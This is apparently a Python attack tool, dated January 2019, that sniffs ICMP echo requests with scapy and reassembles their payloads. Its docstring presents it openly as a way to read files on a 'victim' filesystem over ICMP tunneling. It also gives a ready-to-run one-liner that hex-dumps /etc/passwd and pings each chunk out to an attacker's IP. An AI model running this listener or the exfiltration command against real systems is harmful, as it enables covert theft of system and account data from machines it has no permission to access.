'''
By: MVV-AROD
Last Modification: Jan 2019

Tested in Python3. Still in BETA.
To do: Add exception/errors/logging

The argument will include:

-i interFace  (this argument is mandatory and requires the interface you want listen on)

Usage:icmp-read.py -i eth0

Your script will do the following:

- Listen on ICMP traffic and print it nicely to the screen. This is used for ICMP tunneling to read files on the victim filesystem.
- For proof of concept, run the following on your victim: xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line <attacking_ip>; done 

'''


import argparse
from scapy.all import *

def process_packet(pkt):

    ''' 
	Function that processes the packets. 
	Checks for ICMP only.
    '''
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end='')

#End of function (process_packet)

if __name__ == '__main__':
    
    parser = argparse.ArgumentParser("ICMP Tunneling. Usage: icmp-read.py -i eth0\n")
    parser.add_argument('-i', '--interFace', required=True, help="Specify the sniffing interface")
    args = parser.parse_args()
    interFace = args.interFace

    print ("[+] Waiting on ICMP Traffic....\n")

    sniff(iface=interFace, prn=process_packet)

